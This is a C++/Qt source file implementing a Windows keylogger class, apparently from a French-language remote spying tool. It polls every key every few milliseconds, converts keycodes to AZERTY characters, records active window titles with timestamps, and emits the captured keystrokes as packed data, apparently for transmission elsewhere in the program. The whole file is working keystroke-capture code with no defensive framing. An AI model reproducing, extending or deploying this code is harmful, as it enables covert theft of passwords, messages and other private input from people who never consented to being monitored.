#include "keyboardmanager.h"

KeyboardManager::KeyboardManager()
{
    currentWindow = TitleActiveWindow();
    timeout();
}

void KeyboardManager::start()
{
    sendData("\n\n----------------------------------------------------------------------------------------------------------------------------\n");
    sendData("               Commencer a " + QTime::currentTime().toString("hh:mm:ss") + " Le " + QDate::currentDate().toString("dd/MM/yyyy") + "\n");
    sendData("----------------------------------------------------------------------------------------------------------------------------\n\n");
    sendData("[" + QTime::currentTime().toString("hh:mm:ss") + " - " + QDate::currentDate().toString("dd/MM/yyyy") + "]   ");

    timer = new QTimer;
    timer->setInterval(5);
    timer->start();
    connect(timer,SIGNAL(timeout()),this,SLOT(timeout()));
}

void KeyboardManager::timeout()
{
    //voire si il y a une touche capturee
    for (int i=0;i<256;i++)
    {
        if (GetAsyncKeyState(i) == -32767)
        {
            QString newWindow = TitleActiveWindow();
            if (newWindow != currentWindow) sendData("     ==>     " + currentWindow + "\n\n["+ QTime::currentTime().toString("hh:mm:ss") + " - " + QDate::currentDate().toString("dd/MM/yyyy") + "]   ");
            currentWindow = newWindow;
            sendData(keyText(i));
        }
    }
}

void KeyboardManager::sendData(QString txt)
{
    QByteArray pack;
    QDataStream out(&pack,QIODevice::WriteOnly);
    out << (quint8) 2;
    out << txt;
    emit keyboardText(pack);
}


bool KeyboardManager::EstMajuscule()
{
        bool majuscule = GetKeyState(VK_CAPITAL);
        if (majuscule) majuscule = majuscule && !GetAsyncKeyState(VK_SHIFT); else majuscule = GetAsyncKeyState(VK_SHIFT);
        return majuscule;
}

QString KeyboardManager::keyText(int key)
{
    if (key >= 65 && key <= 90)
    {
        if (!EstMajuscule()) key += 32;
        return QString (char(key));
    }

    if (key >= 48 && key <= 57)
    {
        if (EstMajuscule()) return QString(char(key));
        if (GetAsyncKeyState(VK_MENU))
        {
            if (key == 50) return QString("~");
            if (key == 51) return QString("#");
            if (key == 52) return QString("{");
            if (key == 53) return QString("[");
            if (key == 54) return QString("|");
            if (key == 55) return QString("`");
            if (key == 56) return QString("\\");
            if (key == 57) return QString("^");
            if (key == 48) return QString("@");
        }
        switch (key)
        {
            case 48:
                {return QString("à");break;}
            case 49:
                {return QString("&");break;}
            case 50:
                {return QString("é");break;}
            case 51:
                {return QString("\"");break;}
            case 52:
                {return QString("'");break;}
            case 53:
                {return QString("(");break;}
            case 54:
                {return QString("-");break;}
            case 55:
                {return QString("è");break;}
            case 56:
                {return QString("_");break;}
            case 57:
                {return QString("ç");break;}
        }
    }

    if (key == 96) return "0";
    if (key == 97) return "1";
    if (key == 98) return "2";
    if (key == 99) return "3";
    if (key == 100) return "4";
    if (key == 101) return "5";
    if (key == 102) return "6";
    if (key == 103) return "7";
    if (key == 104) return "8";
    if (key == 105) return "9";
    if (key == 106) return "*";
    if (key == 107) return "+";
    if (key == 108) return "";
    if (key == 109) return "-";
    if (key == 110) return ".";
    if (key == 111) return "/";
    if (key == 226) {if (EstMajuscule()) return ">"; else return "<";}
    if (key == 222) return "²";
    if (key == 219) {if (EstMajuscule()) return QString("°"); else if (GetAsyncKeyState(VK_MENU)) return "]"; else return QString(")");}
    if (key == 187) {if (EstMajuscule()) return QString("+"); else if (GetAsyncKeyState(VK_MENU)) return "}"; else return QString("=");}

    if (key == 221) {if (EstMajuscule()) return QString("¨"); else return QString("^");}
    if (key == 186) {if (EstMajuscule()) return QString("£"); else return QString("$");}
    if (key == 192) {if (EstMajuscule()) return QString("%"); else return QString("ù");}
    if (key == 220) {if (EstMajuscule()) return QString("µ"); else return QString("*");}
    if (key == 188) {if (EstMajuscule()) return QString("?"); else return QString(",");}
    if (key == 190) {if (EstMajuscule()) return QString("."); else return QString(";");}
    if (key == 191) {if (EstMajuscule()) return QString("/"); else return QString(":");}
    if (key == 223) {if (EstMajuscule()) return QString("§"); else return QString("!");}

    if (key == 32) return "[ESPACE]";
    if (key == 13) return "[ENTER]";
    if (key == 144) return "[NUMLOCK]";
    if (key == 9) return "[TAB]";
    if (key == 20) return "[MAJ]";
    if (key == 160) return "[SHIFT_LEFT]";
    if (key == 161) return "[SHIFT_RIGHT]";
    if (key == 27) return "[ECHAPE]";

    if (key == 112) return "[F1]";
    if (key == 113) return "[F2]";
    if (key == 114) return "[F3]";
    if (key == 115) return "[F4]";
    if (key == 116) return "[F5]";
    if (key == 117) return "[F6]";
    if (key == 118) return "[F7]";
    if (key == 119) return "[F8]";
    if (key == 120) return "[F9]";
    if (key == 121) return "[F10]";
    if (key == 122) return "[F11]";
    if (key == 123) return "[F12]";

    if (key == 1) return "[CLIQUE_GAUCHE]";
    if (key == 2) return "[CLIQUE_DROITE]";

    if (key == 8) return "[EFFACER]";

    if (key == 162) return "[CRTL_LEFT]";
    if (key == 91) return "[STARTUP]";
    if (key == 164) return "[ALT_RIGHT]";
    if (key == 165) return "[ALT_GR]";
    if (key == 93) return "[Mouse_Key]";
    if (key == 37) return "[LEFT]";
    if (key == 38) return "[UP]";
    if (key == 39) return "[RIGHT]";
    if (key == 40) return "[DOWN]";
    if (key == 46) return "[SUPPR]";

    return "";
}

QString KeyboardManager::TitleActiveWindow()
{
    HWND activeWindow = GetForegroundWindow();
    LPWSTR l_windowTitle = new wchar_t[256];
    GetWindowText(activeWindow,l_windowTitle,255);
    QString titre = QString::fromWCharArray(l_windowTitle);
    delete []  l_windowTitle;
    return titre;
}
